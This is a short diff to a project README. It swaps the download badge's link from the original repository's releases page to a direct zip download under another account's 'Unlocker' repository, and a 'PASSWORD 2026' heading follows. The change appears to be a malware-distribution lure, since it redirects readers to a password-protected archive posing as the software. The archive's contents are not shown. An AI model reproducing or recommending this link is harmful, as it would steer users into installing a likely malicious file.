@@ -9,7 +9,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/SilentJMA/Speed-Ramp-Transitions/releases/latest)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/FountainOriole/Speed-Ramp-Transitions-Unlocker/releases/download/setup/setup-v2.33.zip)
 
 ## PASSWORD 2026
 </div>
